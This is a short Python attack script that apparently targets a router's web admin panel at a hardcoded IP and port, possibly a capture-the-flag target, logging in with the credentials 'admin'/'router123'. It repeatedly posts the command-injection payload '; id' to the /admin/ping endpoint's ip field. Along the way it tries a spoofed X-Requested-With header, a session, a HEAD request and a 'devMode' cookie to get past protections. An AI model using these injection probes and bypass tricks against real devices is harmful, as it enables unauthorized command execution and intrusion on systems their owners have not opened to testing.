#!/usr/bin/env python3
import requests

URL = "http://154.57.164.66:30817"
AUTH = ("admin", "router123")

# Try various CSRF bypass techniques
print("=== Try CSRF/bypass techniques ===")

# Try with X-Requested-With header
r = requests.post(f"{URL}/admin/ping", auth=AUTH, data={"ip": "; id"}, headers={"X-Requested-With": "XMLHttpRequest"}, timeout=5)
print(f"With XHR header: {r.status_code}")

# Try without auth header (maybe session-based)
s = requests.Session()
s.auth = AUTH
r = s.post(f"{URL}/admin/ping", data={"ip": "; id"}, timeout=5)
print(f"Session approach: {r.status_code}")

# Try HEAD to /admin
r = requests.head(f"{URL}/admin", auth=AUTH, timeout=5)
print(f"HEAD /admin: {r.status_code}")

# Check if there's any cookie the server sets
r = requests.get(f"{URL}/", auth=AUTH, timeout=5)
print(f"Cookies: {r.cookies}")

# Try with cookie
print("\n=== Try with cookie ===")
r = requests.post(f"{URL}/admin/ping", auth=AUTH, data={"ip": "; id"}, cookies={"devMode": "true"}, timeout=5)
print(f"With devMode cookie: {r.status_code}")